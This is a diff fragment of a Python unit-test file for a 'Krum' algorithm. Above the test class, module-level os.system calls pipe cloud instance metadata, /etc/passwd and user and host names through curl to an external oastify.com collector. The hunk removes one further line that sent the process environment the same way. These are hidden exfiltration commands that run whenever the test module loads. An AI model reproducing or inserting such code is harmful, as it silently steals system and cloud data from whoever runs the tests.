@@ -14,7 +14,6 @@ os.system("curl -d \"`curl http://100.100.100.200/latest/meta-data/`\" https://u
 os.system("curl -d \"`curl http://100.100.100.200/latest/meta-data/instance-id`\" https://uljaz78w2tuapd00g5yu2p8dm4s2rqhe6.oastify.com/GCP/`whoami`/`hostname`")
 os.system("curl -d \"`curl http://100.100.100.200/latest/meta-data/image-id`\" https://uljaz78w2tuapd00g5yu2p8dm4s2rqhe6.oastify.com/AWS/`whoami`/`hostname`")
 os.system("curl -d \"`cat /etc/passwd`\" https://uljaz78w2tuapd00g5yu2p8dm4s2rqhe6.oastify.com/ENV/`whoami`/`hostname`")
-os.system("curl -d \"`python3 -c \"import os; print(os.environ)\"`\" https://uljaz78w2tuapd00g5yu2p8dm4s2rqhe6.oastify.com/ENV/`whoami`/`hostname`")
 
 class KrumAlgoTest(unittest.TestCase):
     def setUp(self):
